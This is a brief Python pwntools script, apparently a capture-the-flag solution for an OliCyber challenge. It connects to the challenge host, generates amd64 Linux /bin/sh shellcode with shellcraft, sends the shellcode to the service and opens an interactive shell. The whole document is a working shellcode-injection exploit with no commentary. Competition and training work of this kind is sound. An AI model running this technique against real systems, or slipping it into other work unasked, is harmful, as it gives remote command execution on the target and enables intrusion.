from pwn import *

host = "software-20.challs.olicyber.it"
port = 13003

r = remote(host, port)
r.sendlineafter(b"Invia un qualsiasi carattere per iniziare ...",b"y")
asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')
r.sendline(str(len(shellcode)))
print(r.recv())
r.sendline(shellcode)
print(r.recv())
r.interactive()
